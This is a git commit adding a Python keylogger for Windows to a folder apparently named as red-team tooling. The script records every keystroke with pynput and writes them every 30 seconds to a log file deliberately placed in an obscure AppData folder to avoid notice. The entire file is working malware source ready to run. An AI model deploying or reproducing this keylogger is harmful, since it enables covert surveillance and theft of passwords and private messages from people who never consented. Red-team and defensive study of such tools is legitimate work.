f2253face6b8b689aaa603fa3dcd4cf78feab936
Jupiter Howard <140577712+westofjupiter@users.noreply.github.com>
2026-02-18 22:33:33 -0500

    initial commit

---
+++ red_team_tools/WindowsKeyLogger/keylogger.py
@@ -0,0 +1,34 @@
+from pynput.keyboard import Key, Listener
+import logging
+import threading
+
+path = r"C:\Users\applejack\AppData\Local\Packages\log.txt"	#sets the file path for the log file to an obscure folder
+buffer = ""
+time_interval = 30 #information is recorded to the log every 30 seconds
+
+logging.basicConfig(filename = path, level = logging.DEBUG, format="%(asctime)s: %(message)s")
+
+#each key press is recorded to the buffer
+def on_press(key):
+	global buffer
+	try:
+		buffer += key.char
+	except:
+		if str(key) == "Key.space":
+			buffer += " "
+		else:
+			buffer += str(key)
+
+#the contents of the buffer is sent to the log file and cleared at the designated interval
+def write_log():
+	global buffer
+	threading.Timer(time_interval, write_log).start()
+	if buffer:
+		logging.info("".join(buffer))
+		buffer = ""
+
+write_log()
+
+#listens for key strokes
+with Listener(on_press = on_press) as listener:
+    listener.join()
